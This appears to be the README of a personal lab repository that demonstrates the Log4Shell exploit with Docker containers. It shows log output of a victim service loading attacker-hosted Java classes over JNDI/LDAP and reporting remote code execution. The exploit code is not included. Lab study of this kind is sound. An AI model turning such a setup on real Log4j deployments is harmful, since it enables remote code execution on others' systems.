# Log4Shell Test

This repository serves as my testbed for the Log4Shell exploit. It hosts the
code I played around with to understand how it works.


## Usage

This codebase comes packaged with a `docker compose` file for ease of use. To
see the exploit in action, simply run in the root of this repository
```
$ docker compose up
```

At first, there will be a few `Error looking up JNDI resource`. This is
expected, as it takes some time for the LDAP registry to be populated with the
exploit data. After about six seconds however, something resembling the
following message should be visible, indicating a successful remote code
execution.
```
log4shell-test-attacker_codebase-1             | 172.25.0.5 - - [30/Dec/2021:16:41:22 +0000] "GET /FactoryClass.class HTTP/1.1" 200 1695
log4shell-test-victim-1                        | RCE Acheived in FactoryClass::getObjectInstance!
log4shell-test-victim-1                        | name:    cn=made-class,dc=ldap-registry,dc=attacker
log4shell-test-victim-1                        | nameCtx: com.sun.jndi.ldap.LdapCtx@6e2c9341
log4shell-test-victim-1                        | env:     {}
log4shell-test-victim-1                        | obj:     Reference Class Name: MadeClass
log4shell-test-victim-1                        |
log4shell-test-attacker_codebase-1             | 172.25.0.5 - - [30/Dec/2021:16:41:22 +0000] "GET /RCEMain.class HTTP/1.1" 200 468
log4shell-test-victim-1                        | Function rceMain called!
log4shell-test-attacker_codebase-1             | 172.25.0.5 - - [30/Dec/2021:16:41:22 +0000] "GET /MadeClass.class HTTP/1.1" 200 573
log4shell-test-victim-1                        | RCE Acheived in MadeClass::toString!
log4shell-test-victim-1                        | Function rceMain called!
log4shell-test-victim-1                        | 16:41:22.343 TRACE MainKt - Attempted injection: MadeClass
```
